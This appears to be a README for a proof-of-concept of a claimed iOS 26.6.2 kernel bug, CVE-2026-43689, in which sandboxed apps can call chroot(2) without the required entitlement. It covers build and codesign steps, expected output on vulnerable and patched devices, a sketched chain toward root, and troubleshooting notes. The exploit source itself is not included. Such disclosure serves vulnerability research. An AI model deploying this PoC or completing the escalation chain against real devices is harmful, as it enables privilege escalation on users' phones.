# CVE-2026-43689 — chroot(2) Entitlement Bypass PoC

## Vulnerability
On iOS 26.6.2, the XNU kernel does not check for the `com.apple.private.vfs.chroot` 
entitlement before allowing the `chroot(2)` syscall. Any sandboxed app can call chroot
to change its root directory, enabling privilege escalation.

## Building

### Option A: Xcode Project
1. Create new iOS App project in Xcode
2. Replace `ViewController.m` (or add to `AppDelegate.m`):
   ```objc
   #import "chroot_poc.m"
   
   - (void)viewDidLoad {
       [super viewDidLoad];
       [ChrootPoCController runPoC];
   }
   ```
3. Build for iPhone 17 Pro (arm64e)
4. Deploy via Xcode to device running iOS 26.6.2

### Option B: Command Line (jailbroken/developer device)
```bash
xcrun -sdk iphoneos clang -arch arm64e -DSTANDALONE_BUILD \
    -o chroot_poc chroot_poc.m \
    -framework Foundation \
    -isysroot $(xcrun --sdk iphoneos --show-sdk-path)

# Sign with development cert
codesign -s "Apple Development" --entitlements entitlements.plist chroot_poc

# Deploy and run
```

## Expected Results

### On iOS 26.6.2 (VULNERABLE):
```
[+] !!!! chroot(2) SUCCEEDED !!!!
[+] CVE-2026-43689 CONFIRMED — no entitlement required
[+] Marker content: CVE-2026-43689-CONFIRMED
```

### On iOS 26.7.2+ (PATCHED):
```
[-] chroot(2) FAILED with errno 1: Operation not permitted
[-] EPERM — entitlement check is present (patched kernel)
```

## Exploitation Chain
```
chroot(2) succeeds → fake root filesystem →
path confusion in system services → privilege escalation to root
```

## Notes
- The sandbox profile may independently block chroot(2) even if the kernel allows it
- If EACCES is returned, the sandbox is filtering; need to check the sandbox profile
- If EPERM is returned, the kernel entitlement check is present (patched)
- The PoC creates a fake root under the app's Documents directory
